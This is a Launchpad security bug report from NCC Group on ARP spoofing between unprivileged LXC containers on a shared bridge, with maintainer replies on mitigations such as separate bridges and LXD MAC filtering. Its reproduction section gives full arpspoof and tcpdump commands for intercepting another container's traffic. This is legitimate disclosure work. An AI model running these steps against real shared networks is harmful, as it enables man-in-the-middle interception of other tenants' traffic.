@@ -1,0 +1,213 @@
+Bug #1548497: Cross-Container ARP Poisoning
+
+URL: https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1548497
+
+Metadata: security_related=true; information_type=Public Security; targets=lxc (Ubuntu) (Won't Fix, Undecided)
+
+Description:
+Description:
+
+An unprivileged LXC container can conduct an ARP spoofing attack against another unprivileged LXC container running on the same host. This allows man-in-the-middle attacks on another container's traffic.
+
+Recommendation:
+
+Due to the complex nature of this involving the Linux bridge interface, NCC is not aware of an easy fix. We suggest involving the kernel networking team to allow for ARP restrictions on virtual bridge interfaces. Using ebtables to block and control link layer traffic may also be an effective fix. Documentation should reflect the risks of not using any future protections or ebtables.
+
+Reproduction:
+
+This was found to work on an LXC deployment in AWS. It was then tested on a local Ubuntu VM. For the purposes of reproducibility, the following is an extremely explicit guide to reproducing the issue:
+
+# First, a Ubuntu Trusty 64 VM was setup using vagrant:
+
+vagrant init ubuntu/trusty64
+vagrant up
+vagrant ssh
+
+# Now, inside the new Ubuntu VM:
+
+apt-get update
+apt-get install lxc
+# set up two unprivileged LXC containers (from https://help.ubuntu.com/lts/serverguide/lxc.html)
+mkdir -p ~/.config/lxc
+echo "lxc.id_map = u 0 100000 65536" > ~/.config/lxc/default.conf
+echo "lxc.id_map = g 0 100000 65536" >> ~/.config/lxc/default.conf
+echo "lxc.network.type = veth" >> ~/.config/lxc/default.conf
+echo "lxc.network.link = lxcbr0" >> ~/.config/lxc/default.conf
+echo "$USER veth lxcbr0 2" | sudo tee -a /etc/lxc/lxc-usernet
+lxc-create -t download -n a -- -d ubuntu -r trusty -a amd64
+lxc-create -t download -n b -- -d ubuntu -r trusty -a amd64
+
+# fix cgroup issues (from https://github.com/lxc/lxc/issues/181)
+for c in hugetlb cpuset cpu cpuacct memory devices freezer blkio perf_event; do
+      sudo dbus-send --print-reply --address=unix:path=/sys/fs/cgroup/cgmanager/sock \
+      --type=method_call /org/linuxcontainers/cgmanager org.linuxcontainers.cgmanager0_0.Create \
+      string:$c string:$USER
+
+      sudo dbus-send --print-reply --address=unix:path=/sys/fs/cgroup/cgmanager/sock \
+      --type=method_call /org/linuxcontainers/cgmanager org.linuxcontainers.cgmanager0_0.Chown \
+      string:$c string:$USER int32:$(id -u) int32:$(id -g)
+
+      dbus-send --print-reply --address=unix:path=/sys/fs/cgroup/cgmanager/sock \
+      --type=method_call /org/linuxcontainers/cgmanager org.linuxcontainers.cgmanager0_0.MovePid \
+      string:$c string:$USER int32:$$
+done
+
+#start the containers
+lxc-start -n a -d
+lxc-start -n b -d
+
+# open two new terminal windows
+
+# in one: attach to container A
+lxc-attach -n a
+
+# in another: attach to container B
+lxc-attach -n b
+
+# from now on, all commands will have the full command prompt to make it clear where they are being run
+
+# look at the ARP tables on the host:
+root@vagrant-ubuntu-trusty-64:~# arp -a
+? (10.0.2.2) at 52:54:00:12:35:02 [ether] on eth0
+? (10.0.3.159) at e2:33:5d:33:cf:07 [ether] on lxcbr0
+? (10.0.3.246) at e6:ad:42:7a:f1:54 [ether] on lxcbr0
+? (10.0.2.3) at 52:54:00:12:35:03 [ether] on eth0
+
+# in this case, 10.0.3.159 is container B's eth0, and 10.0.3.246 is container A's eth0
+
+# since the two containers are on the same subnet, it may appear that they can sniff each other's traffic
+# a quick demonstration that you cannot normally sniff traffic on the wire just by virtue of being on the same subnet:
+
+# in container A
+root@a:/# tcpdump -i any -vv -n dst host 10.0.3.159
+# in container B
+root@b:/# nc -lv 8888
+# on the host (type something in the nc session, and note no traffic is output in container A)
+vagrant@vagrant-ubuntu-trusty-64:~$ nc 10.0.3.83 8888
+
+# now, we will demonstrate the ability to sniff traffic with ARP spoofing
+
+# in container A:
+# install dsniff
+apt-get update
+apt-get install dsniff
+# ARP spoof the host:
+arpspoof -t 10.0.3.1 10.0.3.159 &>/dev/null &
+
+# look at the ARP tables on the host and note that both 10.0.3.159 and 10.0.3.246 both now point at the MAC address for container A:
+root@vagrant-ubuntu-trusty-64:~# arp -a
+? (10.0.2.2) at 52:54:00:12:35:02 [ether] on eth0
+? (10.0.3.159) at e6:ad:42:7a:f1:54 [ether] on lxcbr0
+? (10.0.3.246) at e6:ad:42:7a:f1:54 [ether] on lxcbr0
+? (10.0.2.3) at 52:54:00:12:35:03 [ether] on eth0
+
+# note that container B can no longer access the internet (the following command will hang):
+root@b:/# apt-get install curl
+
+# now, from container A, we can ARP spoof container B as well:
+root@a:/# arpspoof -t 10.0.3.159 10.0.3.1 &>/dev/null &
+
+# look at the arp tables in container B and note 10.0.3.1 now points to container A:
+root@b:/# arp -a
+a (10.0.3.246) at e6:ad:42:7a:f1:54 [ether] on eth0
+? (10.0.3.1) at e6:ad:42:7a:f1:54 [ether] on eth0
+
+Finally, we can try to send some traffic from the host to container B, and sniff it from container A
+
+# in B
+root@b:/# nc -lv 8888
+
+# in A:
+root@a:/# apt-get install tcpdump
+root@a:/# tcpdump -i any -vv -n dst host 10.0.3.159
+
+# on the host
+root@vagrant-ubuntu-trusty-64:~# nc 10.0.3.159 8888
+
+# type something in the above nc session, and observe the connection from the host --> B, sniffing from A:
+
+root@a:/# tcpdump -i any -vv -n dst host 10.0.3.159
+tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 65535 bytes
+02:05:05.653355 IP (tos 0x0, ttl 64, id 49639, offset 0, flags [DF], proto TCP (6), length 60)
+   10.0.3.1.43655 > 10.0.3.159.8888: Flags [S], cksum 0x1ace (incorrect -> 0x4bff), seq 2684314036, win 29200, options [mss 1460,sackOK,TS val 761939 ecr 0,nop,wscale 6], length 0
+
+#####
+
+About NCC:
+NCC Group is a security consulting company that performs all manner of
+security testing and has a strong desire to help make the industry a
+better, more resilient place. Because of this, when NCC Group
+identifies vulnerabilities in a system they prefer to work closely with
+vendors to create more secure systems. NCC Group strongly believes in
+responsible disclosure, and has strict guidelines in place to ensure
+that proper disclosure procedure is followed at all times. This serves
+the dual purpose of allowing the vendor to safely secure the product or
+system in question as well as allowing NCC Group to share cutting edge
+research or advisories with the security community.
+
+Discussion:
+Message 2 | Author: stgraber | Subject: Re: Cross-Container ARP Poisoning
+Hi,
+
+Thanks for the report. This is not exactly news to us and has been mentioned publicly a few times.
+
+Our usual answer to this is that if you don't trust your users, you shouldn't grant them access to a shared bridge, instead setup a separate bridge for them.
+
+MAC filtering through ebtables is an option but the problem with this approach is that it essentially prevents container nesting as that would lead to more than one MAC being used by the container which ebtables would block.
+
+At scale, we recommend people use LXD with OpenStack which will setup bridging in the same way it would for VMs with per-port policies, preventing this kind of problem.
+
+On a local system, our answer to that is as I said to either trust everyone you give access to a shared bridge or to segment traffic by using multiple bridges.
+
+---
+Message 3 | Author: seth-arnold | Subject: Re: Cross-Container ARP Poisoning
+Perhaps the "unprivileged containers" portion of https://linuxcontainers.org/lxc/security/ could be updated to include a note about shared bridges?
+
+Stéphane's comment #1 makes sense but it isn't obvious after reading the security statement.
+
+Thanks
+
+---
+Message 4 | Author: stgraber | Subject: Re: Cross-Container ARP Poisoning
+Yep, that's a good point, I'll see about adding some details to our security statement, two things come to mind:
+ - The issue discussed here where a shared bridge can be abused
+ - A shared uid/gid map which can then be DoSed
+
+---
+Message 5 | Author: jesse-hertz | Subject: Re: Cross-Container ARP Poisoning
+Just out of interest, where else has this been mentioned publicly (including these recommendations)?
+
+---
+Message 6 | Author: stgraber | Subject: Re: Cross-Container ARP Poisoning
+I couldn't find where I had mentioned the setup of a bridge per user or tenant, but I found, this e-mail on our mailing list from someone looking at exactly this kind of issue:
+ - https://lists.linuxcontainers.org/pipermail/lxc-users/2011-May/002025.html
+
+And the libvirt-lxc maintainer published a length blog post on the issue:
+ - https://www.berrange.com/posts/2011/10/03/guest-mac-spoofing-denial-of-service-and-preventing-it-with-libvirt-and-kvm/
+
+As for the uid/gid map issue, I outline it and document the way we'd likely avoid this in the LXD design documentation here:
+ - https://github.com/lxc/lxd/blob/master/specs/userns-idmap.md
+
+I absolutely agree that as people start more and more untrusted workloads in containers, this is something they should keep in mind and properly segment their network. Hopefully adding extra documentation on the LXC security page will contribute to that.
+
+---
+Message 7 | Author: serge-hallyn | Subject: Re: [Bug 1548497] Re: Cross-Container ARP Poisoning
+It was also presented in a talk at a containercon a few years back.
+
+---
+Message 8 | Author: seth-arnold | Subject: Re: Cross-Container ARP Poisoning
+Jesse, thanks for the excellent detailed report; please do report future findings. I'm setting this public as it's apparently public enough already.
+
+Thanks
+
+---
+Message 9 | Author: sdeziel | Subject: Re: Cross-Container ARP Poisoning
+With a recent kernel, libvirt can manage the MAC table [*] of the bridge so maybe this is something that can be done by LXC/LXD as well?
+
+*: see the "bridge" section of https://libvirt.org/formatnetwork.html#elementsConnect
+
+---
+Message 10 | Author: stgraber | Subject: Re: Cross-Container ARP Poisoning
+As LXC doesn't directly manage bridges, we don't expect to do anything there, instead you can use network up/down hooks to manually setup filtering.
+
+LXD which does manage networks has support for ipv4, ipv6 and mac filtering on container interfaces.
